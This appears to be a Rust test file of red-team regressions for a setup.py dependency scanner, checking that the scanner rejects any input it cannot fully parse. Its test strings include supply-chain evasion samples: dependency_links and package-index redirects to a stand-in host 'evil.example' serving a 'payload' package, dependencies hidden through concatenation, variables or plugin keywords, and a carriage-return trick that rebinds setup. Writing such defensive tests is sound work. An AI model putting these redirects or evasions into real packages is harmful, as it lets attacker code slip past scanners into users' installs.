//! Red-team regressions for setup.py: every setup() keyword that can carry or redirect
//! dependencies is either parsed or blocks. Nothing may be silently skipped.

use super::*;
use crate::parsers::test_utils::*;

fn parse_source(source: &str) -> Result<Vec<Dependency>> {
    let dir = setup_test_dir("setup-redteam", "setup.py", source);
    let result = parse(&dir);
    cleanup(&dir);
    result
}

fn names(deps: &[Dependency]) -> Vec<&str> {
    let mut names: Vec<&str> = deps.iter().map(|dep| dep.name.as_str()).collect();
    names.sort_unstable();
    names
}

fn assert_blocks(source: &str) {
    let err = parse_source(source).expect_err(&format!("must fail closed: {source}"));
    assert!(
        err.to_string().contains("Scan not supported"),
        "{source}: {err}"
    );
}

#[test]
fn every_dependency_keyword_is_parsed() {
    let deps = parse_source(
        r#"from setuptools import setup
setup(
    name="demo",
    install_requires=["requests==2.31.0"],
    setup_requires=["setuptools-scm==8.0.4"],
    tests_require=["pytest==8.1.1"],
    extras_require={
        "dev": ["black==24.1.0", "ruff==0.3.0"],
        ':python_version < "3.11"': ["tomli==2.0.1"],
        "empty": [],
    },
)
"#,
    )
    .unwrap();
    assert_eq!(
        names(&deps),
        vec![
            "black",
            "pytest",
            "requests",
            "ruff",
            "setuptools-scm",
            "tomli"
        ]
    );
}

#[test]
fn non_dependency_metadata_is_accepted_as_noise() {
    let deps = parse_source(
        r#"import setuptools
VERSION = "1.0.0"
setuptools.setup(
    name="demo",
    version="1.0.0",
    description="text with install_requires=['fake==1'] inside",
    long_description="long",
    long_description_content_type="text/markdown",
    author="A",
    author_email="a@example.com",
    maintainer="M",
    maintainer_email="m@example.com",
    url="https://example.com",
    download_url="https://example.com/dl",
    project_urls={"Source": "https://example.com/src"},
    license="MIT",
    license_files=["LICENSE"],
    classifiers=["Programming Language :: Python :: 3"],
    keywords=["a", "b"],
    platforms=["any"],
    packages=["demo"],
    package_dir={"": "src"},
    package_data={"demo": ["*.json"]},
    include_package_data=True,
    zip_safe=False,
    py_modules=["demo_mod"],
    scripts=["bin/demo"],
    entry_points={"console_scripts": ["demo = demo:main"]},
    python_requires=">=3.8, !=3.9.0",
    requires=["os"],
    provides=["demo"],
    obsoletes=["old-demo"],
    test_suite="tests",
    install_requires=["requests==2.31.0"],
)
"#,
    )
    .unwrap();
    assert_eq!(names(&deps), vec!["requests"]);
}

#[test]
fn dependency_links_block() {
    assert_blocks(
        "setup(install_requires=['payload==1.0.0'], dependency_links=['https://evil.example/payload-1.0.0.tar.gz#egg=payload-1.0.0'])",
    );
    // An empty list redirects nothing.
    let deps =
        parse_source("setup(install_requires=['requests==2.31.0'], dependency_links=[])").unwrap();
    assert_eq!(names(&deps), vec!["requests"]);
}

#[test]
fn command_options_that_redirect_build_dependency_fetching_block() {
    for source in [
        "setup(setup_requires=['payload==1.0.0'], options={'easy_install': {'index_url': 'https://evil.example/simple'}})",
        "setup(setup_requires=['payload==1.0.0'], options={\"easy_install\": {\"find_links\": \"https://evil.example\"}})",
    ] {
        assert_blocks(source);
    }
    let deps = parse_source(
        "setup(install_requires=['requests==2.31.0'], options={'bdist_wheel': {'universal': True}})",
    )
    .unwrap();
    assert_eq!(names(&deps), vec!["requests"]);
}

#[test]
fn unknown_or_plugin_keywords_block() {
    for source in [
        // pbr reads requirements.txt into install_requires.
        "setup(setup_requires=['pbr==6.0.0'], pbr=True)",
        // d2to1 / setup_cfg plugins pull metadata (and dependencies) from elsewhere.
        "setup(setup_requires=['d2to1==0.2.12'], d2to1=True)",
        "setup(install_requires=['requests==2.31.0'], some_plugin_option=['payload==1.0.0'])",
        // A misspelled key is not installed by setuptools, but could still be what the
        // author meant; the scan cannot tell.
        "setup(install_require=['payload==1.0.0'])",
    ] {
        assert_blocks(source);
    }
}

#[test]
fn repeated_keywords_block() {
    assert_blocks(
        "setup(install_requires=['payload==1.0.0'], name='demo', install_requires=['requests==2.31.0'])",
    );
    assert_blocks("setup(extras_require={'a': ['payload==1.0.0']}, extras_require={})");
}

#[test]
fn concatenated_or_variable_dependency_values_block() {
    for source in [
        "setup(install_requires=['requests==2.31.0'] + ['payload==1.0.0'])",
        "setup(install_requires=BASE + ['payload==1.0.0'])",
        "BASE = 'payload==1.0.0'\nsetup(install_requires=[BASE])",
        "setup(setup_requires=['a==1.0.0'] + EXTRA)",
        "setup(tests_require=TEST_DEPS)",
        "setup(tests_require=['a==1.0.0'] * 2)",
        "setup(install_requires=[f'payload=={V}'])",
        "setup(install_requires=[u'payload==1.0.0'])",
        "setup(install_requires=('payload==1.0.0',))",
        "setup(install_requires=list(DEPS))",
    ] {
        assert_blocks(source);
    }
}

#[test]
fn string_valued_dependency_keywords_block() {
    // setuptools accepts a newline-separated string here; it must not be skipped.
    for source in [
        "setup(install_requires='payload==1.0.0')",
        "setup(setup_requires=\"payload==1.0.0\")",
        "setup(tests_require='payload==1.0.0')",
        "setup(extras_require='payload==1.0.0')",
    ] {
        assert_blocks(source);
    }
}

#[test]
fn unmodeled_extras_require_forms_block() {
    for source in [
        "setup(extras_require={'dev': 'payload==1.0.0'})",
        "setup(extras_require={'dev': DEV})",
        "setup(extras_require={'dev': ['a==1.0.0'] + ['payload==1.0.0']})",
        "setup(extras_require={'dev': [['payload==1.0.0']]})",
        "setup(extras_require={DEV_KEY: ['payload==1.0.0']})",
        "setup(extras_require={1: ['payload==1.0.0']})",
        "setup(extras_require=dict(dev=['payload==1.0.0']))",
        "setup(extras_require={**BASE, 'dev': ['payload==1.0.0']})",
        "setup(extras_require={k: ['payload==1.0.0'] for k in 'ab'})",
        "setup(extras_require=[('dev', ['payload==1.0.0'])])",
    ] {
        assert_blocks(source);
    }
}

#[test]
fn a_lone_carriage_return_blocks() {
    // Python ends the first line at the `\r`, so the next statement rebinds `setup`.
    let source = "from setuptools import setup # c\rsetup = lambda **kw: kw\nsetup(name=\"d\", install_requires=[\"six==1.16.0\"])\n";
    let err = parse_source(source).unwrap_err().to_string();
    assert!(err.contains("line terminator"), "{err}");
}
